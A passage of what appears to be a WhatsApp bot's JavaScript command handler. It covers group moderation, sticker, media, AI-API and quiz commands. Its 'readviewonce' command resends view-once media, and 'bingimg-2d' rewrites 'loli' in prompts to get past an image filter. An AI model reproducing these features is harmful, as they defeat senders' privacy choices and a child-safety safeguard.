                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                } else {
                    var memeg = await zuu.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                }
                break
                case "dn": 
                zuu.sendMessage(m.chat, {
                    text: "@" + m.chat,
                    contextInfo: {
                        groupMentions: [{
                            groupJid: m.chat,
                            groupSubject: text
                        }]
                    }
                })
                break
            case 'everyone':
            case "tagall":
                
                zuu.sendMessage(m.chat, {
                    text: "@" + m.chat,
                    contextInfo: {
                        mentionedJid: (await (await zuu.groupMetadata(m.chat)).participants).map(a => a.id),
                        groupMentions: [{
                            groupJid: m.chat,
                            groupSubject: 'everyone'
                        }]
                    }
                })
                break
            case 'totag':
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (!m.quoted) return reply(`Reply messages with captions ${prefix + command}`)
                zuu.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[0] === 'close') {
                    await zuu.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`️Success In Closing The Group️`)).catch((err) => reply(json(err)))
                } else if (args[0] === 'open') {
                    await zuu.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Success In Opening The Group️`)).catch((err) => reply(json(err)))
                } else {
                    reply(`*\`[ Mode ${command} ]\`*\n\nType ${prefix + command}open/close`)
                }
                break
            case 'hidetag':
            case 'ht': {
                if (!isAdmins) return
                zuu.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            }
            break

            case 'linkgroup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink': {
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let response = await zuu.groupInviteCode(m.chat);
                reply(`𝐺𝑟𝑜𝑢𝑝 𝑛𝑎𝑚𝑒:- ${groupMetadata.subject}\n𝐺𝑟𝑜𝑢𝑝 𝑙𝑖𝑛𝑘: https://chat.whatsapp.com/${response}`)
            }
            break
            case 'resetlinkgc':
            case 'resetlinkgroup':
            case 'resetlinkgrup':
            case 'revoke':
            case 'resetlink':
            case 'resetgrouplink':
            case 'resetgclink':
            case 'resetgruplink':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                await zuu.groupRevokeInvite(m.chat)
                    .then(res => {
                        reply(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => reply(json(err)))
                break
                //=================================================//
            case "disk": {
                exec('cd && du -h --max-depth=1', (err, stdout) => {
                    if (err) return reply(`${err}`)
                    if (stdout) return reply(stdout)
                })
            }
            break
            //=================================================//
            case "add": {
                if (m.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
                if (!text && !m.quoted) reply('masukkan nomor yang ingin di tambahkan')
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await zuu.groupParticipantsUpdate(m.chat, [users], 'add').catch(console.log)
            }
            break
            //=================================================//
            case "kick": {
                if (m.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
                if (!text && !m.quoted) reply('masukkan nomor yang ingin di kick')
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await zuu.groupParticipantsUpdate(m.chat, [users], 'remove').catch(console.log)
            }
            break
            //=================================================//
            case "promote": {
                if (m.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
                if (!text && !m.quoted) reply('masukkan nomor yang ingin di promote')
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await zuu.groupParticipantsUpdate(m.chat, [users], 'promote').catch(console.log)
            }
            break
            //=================================================//
            case "demote": {
                if (m.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
                if (!text && !m.quoted) reply('masukkan nomor yang ingin di demote')
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await zuu.groupParticipantsUpdate(m.chat, [users], 'demote').catch(console.log)
            }
            break
            //=================================================//
            case "ai": {
                if (!text) return reply("mau nanya apa sama naw")
                let {
                    data
                } = await axios.get("https://www.putz.my.id/api/ai?type=hercai&q=" + text)
                reply(data.result)
            }
            break
            //=================================================//
            case "gemini-img": {
                if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply("hanya support gambar")
                let media = await zuu.downloadAndSaveMediaMessage(qmsg)
                let urlgambar = await TelegraPH(media)
                let {
                    data
                } = await axios.get("https://gmni.vercel.app/api/img?imageUrl=" + urlgambar + "&prompt=" + text)
                reply(data.text)
            }
            break
            //=================================================//
            case "gemini": {
                if (!text) return reply("mau nanya apa sama naw")
                let {
                    data
                } = await axios.get("https://gmni.vercel.app/api/ask?text=" + text)
                reply(data.text)
            }
            break
            //=================================================//
            case "ocr": {
                let q = m.quoted ? m.quoted : m
                let mime = (q.msg || q).mimetype || ''
                if (!mime) return reply(`balas gambar dengan perintah .ocr`)
                if (!/image\/(jpe?g|png)/.test(mime)) return reply(`_*jenis ${mime} tidak didukung!*_`)
                const ocrapi = require("ocr-space-api-wrapper")
                let img = await zuu.downloadAndSaveMediaMessage(q)
                let url = await TelegraPH(img)
                let hasil = await ocrapi.ocrSpace(url)
                await reply(hasil.ParsedResults[0].ParsedText)
            }
            break
            case "tr": {
                let lang, text
                if (args.length >= 2) {
                    lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
                } else if (m.quoted && m.quoted.text) {
                    lang = args[0] ? args[0] : 'id', text = m.quoted.text
                } else throw `Ex: ${usedPrefix + command} id hello i am robot`
                const translate = require('@vitalets/google-translate-api')
                let res = await translate(text, {
                    to: lang,
                    autoCorrect: true
                }).catch(_ => null)
                if (!res) return reply(`Error : Bahasa"${lang}" Tidak Support`)
                reply(`*Terdeteksi Bahasa:* ${res.from.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
            }
            break
            //=================================================//
            case 'ss':
            case 'ssweb': {
                if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
                let krt = await ssweb(text)
                zuu.sendMessage(m.chat, {
                    image: krt.result,
                    caption: "Done"
                }, {
                    quoted: fsaluran
                })
            }
            break
            //=================================================//
            case "kalkulator": {
                val = text
                    .replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
                    .replace(/×/g, '*')
                    .replace(/÷/g, '/')
                    .replace(/π|pi/gi, 'Math.PI')
                    .replace(/e/gi, 'Math.E')
                    .replace(/\/+/g, '/')
                    .replace(/\++/g, '+')
                    .replace(/-+/g, '-')
                let format = val
                    .replace(/Math\.PI/g, 'π')
                    .replace(/Math\.E/g, 'e')
                    .replace(/\//g, '÷')
                    .replace(/\*×/g, '×')
                try {
                    console.log(val)
                    let result = (new Function('return ' + val))()
                    if (!result) throw result
                    reply(`*${format}* = _${result}_`)
                } catch (e) {
                    if (e == undefined) return reply('Isinya?')
                    reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
                }
            }
            break
            //=================================================//
            case 'bass':
            case 'blown':
            case 'deep':
            case 'earrape':
            case 'fast':
            case 'fat':
            case 'nightcore':
            case 'reverse':
            case 'robot':
            case 'slow':
            case 'smooth':
            case 'tupai': {
                if (!qmsg) return reply("reply audio nya")
                try {
                    let set
                    if(/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                    if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                    if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                    if (/earrape/.test(command)) set = '-af volume=12'
                    if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                    if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                    if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                    if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                    if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                    if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                    if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                    if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                    if (/audio/.test(mime)) {
                        let media = await zuu.downloadAndSaveMediaMessage(qmsg)
                        let ran = pickRandom('.mp3')
                        exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                            fs.unlinkSync(media)
                            if (err) return reply(err)
                            let buff = fs.readFileSync(ran)
                            zuu.sendMessage(m.chat, {
                                audio: buff,
                                mimetype: 'audio/mpeg'
                            }, {
                                quoted: fsaluran
                            })
                            fs.unlinkSync(ran)
                        })
                    } else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                    console.log(e)
                    reply('error')
                }
            }
            break
            //=================================================//
            case "jarak": {
                var [from, to] = text.split`|`
                if (!(from && to)) return reply(`Ex: ${prefix + command} jakarta|bandung`)
                var data = await jarak(from, to)
                if (data.img) return zuu.sendMessage(m.chat, {
                    image: data.img,
                    caption: data.desc
                }, {
                    quoted: fsaluran
                })
                else reply(data.desc)
            }
            break
            //=================================================//
            case 'cls': {
                if (!m.quoted) return reply('Reply with a sticker!')
                let stiker = false
                try {
                    let [packname, ...author] = text.split('|')
                    author = (author || []).join('|')
                    let mime = m.quoted.mimetype || ''
                    if (!/webp/.test(mime)) throw 'Reply with a sticker!'
                    let img = m.quoted.download()
                    if (!img) throw 'Failed to download sticker!'
                    stiker = await addExif(img, packname || global.packname, author || global.author)
                } catch (e) {
                    console.error(e)
                    if (Buffer.isBuffer(e)) stiker = e
                    else throw 'An error occurred: ' + e
                } finally {
                    if (stiker) zuu.sendFile(m.chat, stiker, 'wms.webp', '', m, false, {
                        asSticker: true
                    })
                    else throw 'Conversion failed'
                }
            }
            break
            //=================================================//
            case 'tts': {
                if (!text) return reply(`[ ! ] .${command} halo world`)
                const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", {
                    text: text,
                    voice: "id_001"
                }, {
                    headers: {
                        Referer: "https://gesserit.co/tiktok",
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                        responseType: "arraybuffer"
                    }
                })).data
                const b = Buffer.from(a.audioUrl)
                zuu.sendMessage(m.chat, {
                    audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
                    mimetype: "audio/mpeg"
                })
            }
            break
            //=================================================//
            case 'remini': {
                if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply("hanya support gambar")
                let media = await quoted.download()
                const This = await remini(media, "enhance");
                zuu.sendFile(m.chat, This, "", mess.done, m);
            }
            break
            //=================================================//
            case 'tiktok':
            case 'tt': {
                if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
                let res = await tiktok(`${text}`)
                zuu.sendMessage(m.chat, {
                    video: {
                        url: res.no_watermark
                    },
                    fileName: `tiktok.mp4`,
                    mimetype: 'video/mp4'
                }).then(() => {

                    zuu.sendMessage(m.chat, {
                        audio: {
                            url: res.music
                        },
                        fileName: `tiktok.mp3`,
                        mimetype: 'audio/mp4'
                    })
                })
            }
            break
            //=================================================//
            case "get": {
                if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
                let linknyaurl = await shorturl(text)
                let _url = new URL(text)
                let url = `${_url.origin}${_url.pathname}${_url.search}`;
                let res = await fetch(url)
                if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
                    delete res
                    throw `Content-Length: ${res.headers.get('content-length')}`
                }
                if (!/text|json/.test(res.headers.get('content-type'))) return zuu.sendFile(m.chat, url, 'file', `*Link:* ${linknyaurl}\n\n2024 © Kiyoo`, m)
                let txt = await res.buffer()
                try {
                    txt = util.format(JSON.parse(txt + ''))
                } catch (e) {
                    txt = txt + ''
                } finally {
                    reply(txt.slice(0, 65536) + '')
                }
            }
            break
            //=================================================//
            case 'readvo':
            case 'readviewonce': {
                if (!m.quoted) return reply('reply gambar/video yang ingin Anda lihat')
                if (m.quoted.mtype !== 'viewOnceMessageV2') return reply('Ini bukan pesan view-once.')
                let msg = m.quoted.message
                let type = Object.keys(msg)[0]
                const {
                    downloadContentFromMessage
                } = require('@adiwajshing/baileys')
                let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
                let buffer = Buffer.from([])
                for await (const chunk of media) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                if (/video/.test(type)) {
                    return zuu.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
                } else if (/image/.test(type)) {
                    return zuu.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
                }
            }
            break
            //=================================================//
            case 'qc': {
                let text
                if (args.length >= 1) {
                    text = args.slice(0).join(" ")
                } else if (m.quoted && m.quoted.text) {
                    text = m.quoted.text
                } else reply("Input teks atau reply teks yang ingin di jadikan quote!")
                if (!text) return reply('masukan text')
                if (text.length > 30) return reply('Maksimal 30 Teks!')
                let ppnyauser = await zuu.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
                const rest = await quote(text, pushname, ppnyauser)
                zuu.sendImageAsSticker(m.chat, rest.result, m, {
                    packname: `${global.packname}`,
                    author: `${global.author}`
                })
            }
            break
            //=================================================//
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await zuu.sendImageAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
                    let media = await quoted.download()
                    let encmedia = await zuu.sendVideoAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-10 Detik`)
                }
            }
            break
            //=================================================//
            case 'smeme': {
                let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return reply(respond)
                if (!text) return reply(respond)
                try {
                    atas = text.split('|')[0] ? text.split('|')[0] : '-'
                    bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                    let dwnld = await zuu.downloadAndSaveMediaMessage(qmsg)
                    let fatGans = await TelegraPH(dwnld)
                    let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                    let FaTiH = await zuu.sendImageAsSticker(m.chat, smeme, m, {
                        packname: global.packname,
                        author: global.auhor
                    })
                    await fs.unlinkSync(FaTiH)
                } catch (e) {}
            }
            break
            //=================================================//
            case 'swm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) return reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
                if (!teks2) return reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
                if (/image/.test(mime)) {
                    let media = await zuu.downloadMediaMessage(qmsg)
                    let encmedia = await zuu.sendImageAsSticker(m.chat, media, m, {
                        packname: teks1,
                        author: teks2
                    })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
                    let media = await zuu.downloadMediaMessage(qmsg)
                    let encmedia = await zuu.sendVideoAsSticker(m.chat, media, m, {
                        packname: teks1,
                        author: teks2
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            //=================================================//
            case "bingimg-2d": {
                if (!text) return reply("[ ! ] masukan prompt gambar yang mau di bikin");
                let teksu = text.replace(/loli/gi, "anak gadis kecil");
                try {
                    const {
                        BingApi,
                        apikeybing
                    } = require('./lib/bing-image.js');
                    const bingApi = new BingApi(apikeybing);
                    const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
                    const totalCount = imagesUrls.length;
                    const credits = await bingApi.getCredits();

                    if (totalCount > 0) {
                        for (let i = 0; i < totalCount; i++) {
                            try {
                                await new Promise(resolve => setTimeout(resolve, i * 6000));
                                zuu.sendMessage(m.chat, {
                                    image: {
                                        url: imagesUrls[i]
                                    },
                                    caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}`
                                }, {
                                    quoted: fsaluran
                                });
                            } catch (error) {
                                console.error(`Error sending file: ${error.message}`);
                                await reply(`Failed to send image *(${i + 1}/${totalCount})*`);
                            }
                        }
                    } else {
                        await reply('No images found after filtering.');
                    }
                } catch (error) {
                    await reply('An error occurred while processing the request.');
                }
            };
            break
            //=================================================//
            case "ping":
            case "botstatus":
            case "statusbot": {

                let respon = ` *ᴘ ɪ ɴ ɢ* 
 ${Math.round(neww - oldd)} ms 
 ${latensi.toFixed(4)} ms 

 *ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ*
 ${runtime(process.uptime())} 

 *s ᴇ ʀ ᴠ ᴇ ʀ* 
 *🛑 ʀᴀᴍ:* ${formatSize(ramused)} (${persenramm.toString().split('.')[0]}%) / ${formatSize(totalram)} 
 *🔵 ғʀᴇᴇRAM:* ${formatSize(sisaram)} 
 *🔴 ᴍᴇᴍᴏʀy:* ${ram}
 *🗂 ᴅɪꜱᴋ:* ${formatSize(diskused)} / ${formatSize(totalspace)}
 *📂 ғʀᴇᴇDISK:* ${formatSize(freespace)}
 *🔭 ᴘʟᴀᴛғᴏʀᴍ:* ${os.platform()}
 *🧿 sᴇʀᴠᴇʀ:* ${os.hostname()}
 *📤 ᴜᴘʟᴏᴀᴅ:* ${upload}
 *📥 ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
 *⏰ ᴛɪᴍᴇ sᴇʀᴠᴇʀ:* ${jam} : ${menit} : ${detik}
 
 *📮 ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
 *💻 ᴄᴘᴜ ᴍᴏᴅᴇʟ:* ${cpuuuu[0].model}
 *📊 ᴏꜱ ᴠᴇʀꜱɪᴏɴ:* ${os.version()}
 
_NodeJS Memory Usaage_
${Object.keys(used)
.map(
(key, _, arr) =>
`${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
used[key],
)}`,
)
.join("\n")}
${readmore}
${cpus[0]
? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
.map(
(cpu, i) =>
`${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
cpu.times,
)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}`,
)
.join("\n\n")}`
: ""
}
`.trim();
 zuu.relayMessage(m.chat, {
     requestPaymentMessage: {
         currencyCodeIso4217: 'IDR',
         requestFrom: '0@s.whatsapp.net',
         noteMessage: {
             extendedTextMessage: {
                 text: respon,
                 contextInfo: {
                     mentionedJid: [m.sender],
                     externalAdReply: {
                         showAdAttribution: true
                     }
 }
             }
         }
     }
 }, {})
}
break




            case 'addcase': {
if (!isCreator) return reply(mess.owner)
if (!text) return ('Tambahkan case yang ingin di masukan');
const namaFile = './case.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Error File:', err);
            } else {
                reply('Sukses Menambahkan case');
            }
        });
    } else {
        reply('Gagal Menambahkan case');
    }
});

            }
            break;




            default:
                if (userdb.game) {
                    if (budy) {
                      if (prefix) return
                        if (userdb.tebakgambar === true) {
                            kuis = true;
                            let jawaban = userdb.jawaban
                            let userJawaban = m.text.toUpperCase();
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*');
                                delete tebakgambar[m.sender.split('@')[0]];
                                userdb.tebakgambar = false;
                            } else if (userJawaban === jawaban) {
                                await zuu.sendText(m.chat, '*`[ Tebak Gambar ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                delete tebakgambar[m.sender.split('@')[0]];
                                userdb.bits += 143
                                userdb.tebakgambar = false;
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*');
                            }
                        } else if (userdb.tebakkata === true) {
                            kuis = true;
                            jawaban = userdb.jawaban
                            jawabres = m.text.toUpperCase();
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*')
                                userdb.tebakkata = false
                                delete tebakkata[m.sender.split('@')[0]]
                            } else if (jawabres === jawaban) {
                                await zuu.sendText(m.chat, '*`[ Tebak Kata ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                userdb.tebakkata = false
                                userdb.bits += 143
                                delete tebakkata[m.sender.split('@')[0]]
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*')
                            }
                        } else if (userdb.tebakkalimat === true) {
                            kuis = true;
                            jawaban = userdb.jawaban
                            jawabres = m.text
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*')
                                userdb.tebakkalimat = false
                                delete tebakkalimat[m.sender.split('@')[0]]
                            } else if (jawabres === jawaban) {
                                await zuu.sendText(m.chat, '*`[ Tebak Kalimat ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                userdb.tebakkalimat = false
                                userdb.bits += 143
                                delete tebakkalimat[m.sender.split('@')[0]]
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*')
                            }
                        } else if (userdb.tebaklirik === true) {
                            kuis = true;
                            jawabanban = userdb.jawaban
                            jawabresres = m.text.charAt(0).toUpperCase() + m.text.slice(1);
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*')
                                userdb.tebaklirik = false
                                delete tebaklirik[m.sender.split('@')[0]]
                            } else if (jawabresres === jawabanban) {
                                await zuu.sendText(m.chat, '*`[ Tebak Lirik ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                userdb.tebaklirik = false
                                userdb.bits += 143
                                delete tebaklirik[m.sender.split('@')[0]]
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*')
                            }

                        } else if (userdb.tebaktebakan === true) {
                            try {
                                kuis = true;
                                jawabanya = userdb.jawaban
                                jawabresya = m.text
                                if (m.text.toLowerCase() == "nyerah") {
                                    userdb.game = false
                                    await reply('*Anda Telah menyerah*')
                                    userdb.tebaktebakan = false
                                    delete tebaktebakan[m.sender.split('@')[0]]
                                } else if (jawabresya === jawabanya) {
                                    await zuu.sendText(m.chat, '*`[ Tebak Tebakan ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                    userdb.tebaktebakan = false
                                    userdb.bits += 143
                                    delete tebaktebakan[m.sender.split('@')[0]]
                                } else {
                                    if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                    reply('*Jawaban Salah!*')
                                }
                            } catch (e) {
                                reply(util.format(e))
                            }
                        } else if (userdb.tebakbendera === true) {
                            kuis = true;
                            jawabanyaa = userdb.jawaban
                            jawabresyaa = m.text
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*')
                                userdb.tebakbendera = false
                                delete tebakbendera[m.sender.split('@')[0]]
                            } else if (jawabresyaa === jawabanyaa) {
                                await zuu.sendText(m.chat, '*`[ Tebak Bendera ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                userdb.tebakbendera = false
                                userdb.bits += 143
                                delete tebakbendera[m.sender.split('@')[0]]
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*')
                            }
                        } else if (userdb.tebakkimia === true) {
                            kuis = true;
                            jawabanyaaa = userdb.jawaban
                            jawabresyaaa = m.text
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*')
                                userdb.tebakkimia = false
                                delete tebakkimia[m.sender.split('@')[0]]
                            } else if (jawabresyaaa === jawabanyaaa) {
                                await zuu.sendText(m.chat, '*`[ Tebak Kimia ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                userdb.tebakkimia = false
                                userdb.bits += 143
                                delete tebakkimia[m.sender.split('@')[0]]
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*')
                            }

                        } else if (userdb.tebaktekateki === true) {
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*')
                                userdb.tebaktekateki = false
                                delete tebaktekateki[m.sender.split('@')[0]]
                            } else if (m.text === userdb.jawaban) {
                                await zuu.sendText(m.chat, '*`[ Tebak Teka-Teki ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                userdb.tebaktekateki = false
                                userdb.bits += 143
                                delete tebaktekateki[m.sender.split('@')[0]]
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*')
                            }
                        } else if (userdb.tebaksusunkata === true) {
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*')
                                userdb.tebaksusunkata = false
                                delete tebaksusunkata[m.sender.split('@')[0]]
                            } else if (m.text === userdb.jawaban) {
                                await zuu.sendText(m.chat, '*`[ Tebak Susun Kata ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                userdb.tebaksusunkata = false
                                userdb.bits += 143
                                delete tebaksusunkata[m.sender.split('@')[0]]
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*')
                            }
                        } else if (userdb.tebaksiapaaku === true) {
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*')
                                userdb.tebaksiapaaku = false
                                delete tebaksiapakahaku[m.sender.split('@')[0]]
                            } else if (m.text === userdb.jawaban) {
                                await zuu.sendText(m.chat, '*`[ Tebak Siapa Aku- ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                userdb.tebaksiapaaku = false
                                userdb.bits += 143
                                delete tebaksiapakahaku[m.sender.split('@')[0]]
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*')
                            }
                        } else if (userdb.tebakasahotak === true) {
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*')
                                userdb.tebakasahotak = false
                                delete tebakasahotak[m.sender.split('@')[0]]
                            } else if (m.text === userdb.jawaban) {
                                await zuu.sendText(m.chat, '*`[ Tebak Asah Otak ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                userdb.tebakasahotak = false
                                userdb.bits += 143
                                delete tebakasahotak[m.sender.split('@')[0]]
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*')
                            }
                        } else if (userdb.kuismath === true) {
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*')
                                userdb.kuismath = false
                                delete kuismath[m.sender.split('@')[0]]
                            } else if (m.text === userdb.jawaban) {
